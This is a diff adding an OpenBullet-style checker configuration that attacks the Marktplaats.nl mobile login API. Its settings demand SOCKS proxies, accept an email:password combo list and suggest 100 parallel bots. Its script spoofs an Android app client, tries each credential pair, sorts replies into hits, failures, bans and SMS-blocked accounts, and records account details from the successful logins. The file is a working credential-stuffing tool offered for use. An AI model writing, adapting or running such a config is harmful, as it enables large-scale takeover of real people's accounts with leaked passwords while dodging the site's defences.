@@ -1,0 +1,87 @@
+[SETTINGS]
+{
+  "Name": "Marktplaats.nl",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2020-05-09T01:03:09.5807539+02:00",
+  "AdditionalInfo": "",
+  "Author": "Dedrilath",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": true,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+FUNCTION GenerateGUID -> VAR "S" 
+
+FUNCTION RandomString "d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?dd" -> VAR "M" 
+
+FUNCTION Hash MD5 "<USER>:<PASS>" -> VAR "UP" 
+
+REQUEST POST "https://app.marktplaats.nl/app/identity/v2/login?session=<S>&screen_width=76&screen_height=135&app_ver=Android10.33.1&magic_number=-<UP>&user_state=0" 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\",\"type\":\"user-credentials\",\"verificationParameters\":null}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G955N Build/NRD90M) AppVersion-10.33.1" 
+  HEADER "Authorization: Bearer <UP>" 
+  HEADER "ECG-Tenant: mp" 
+  HEADER "ECG-Locale: nl-NL" 
+  HEADER "Content-Length: 100" 
+  HEADER "Host: app.marktplaats.nl" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<RESPONSECODE>" Contains "200" 
+  KEYCHAIN Failure OR 
+    KEY "<RESPONSECODE>" Contains "400" 
+  KEYCHAIN Ban OR 
+    KEY "<RESPONSECODE>" Contains "403" 
+    KEY "Access denied" 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "USER_BLOCKED" 
+    KEY "method\":\"sms\",\"message" 
+    KEY "VERIFICATION_REQUESTS_BLOCKED" 
+
+PARSE "<SOURCE>" LR "\"oneClickOptedIn\":" ",\"" CreateEmpty=FALSE -> CAP "Met 1 klik" 
+
+PARSE "<SOURCE>" LR ",\"oneClickBlocked\":" "}}" CreateEmpty=FALSE -> CAP "Met 1 klik geblokkeerd" 
+
